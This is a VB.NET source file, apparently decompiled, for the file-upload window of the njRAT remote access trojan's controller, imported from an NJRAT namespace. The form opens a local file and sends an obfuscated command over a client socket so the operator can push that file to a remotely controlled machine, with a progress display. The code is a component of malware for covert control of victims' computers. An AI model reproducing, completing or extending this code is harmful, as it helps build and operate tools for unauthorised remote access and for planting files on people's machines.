Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports NJRAT.NJRAT

Public Class up
    Inherits Form
    ' Methods
    Public Closinge As Boolean
    Public FN As String
    Public FS As FileStream
    Public os As Integer
    Public osk As Client
    Public sk As Client
    Public SZ As Integer
    Public TMP As String
    Public Sub New()
        Me.Closinge = False
        Me.os = 0
        Me.InitializeComponent()
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Me.Close()
    End Sub

    Private Sub up_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing
        Me.Closinge = True
        Try
            Me.FS.Close()
            Me.FS.Dispose()
        Catch exception1 As Exception
        End Try
        Try
            Me.sk.Close()
        Catch exception3 As Exception
        End Try
    End Sub

    Private Sub up_Load(sender As Object, e As EventArgs) Handles Me.Load
        Me.FS = New FileStream(Me.TMP, FileMode.Open)
        Me.Lv1.Items.Item(0).SubItems.Item(0).Text = New FileInfo(Me.TMP).Name
        Me.Lv1.Items.Item(1).SubItems.Item(0).Text = Class6.smethod_17(CLng(Me.SZ))
        Me.Lv1.Items.Item(2).SubItems.Item(0).Text = Class6.smethod_17(0)
        Me.Lv1.Items.Item(3).SubItems.Item(0).Text = Class6.smethod_17(0)
        Me.ProgressBar1.Maximum = Me.SZ
        Me.osk.Send(String.Concat(New String() {"Ex", Class7.string_1, "fm", Class7.string_1, "up", Class7.string_1, Me.osk.ip, Class7.string_1, Class6.smethod_14(Me.FN), Class7.string_1, Conversions.ToString(Me.SZ)}))
        Me.Lv1.method_3()
        Me.vmethod_4.Enabled = True
    End Sub

    Private Sub vmethod_4_Tick(sender As Object, e As EventArgs) Handles vmethod_4.Tick
        Try
            Me.Lv1.Items.Item(2).SubItems.Item(1).Text = Class6.smethod_17(CLng((Me.ProgressBar1.Value - Me.os)))
            Me.os = Me.ProgressBar1.Value
            Me.Lv1.Items.Item(3).SubItems.Item(1).Text = Class6.smethod_17(CLng(Me.ProgressBar1.Value))
        Catch exception1 As Exception
        End Try
    End Sub
End Class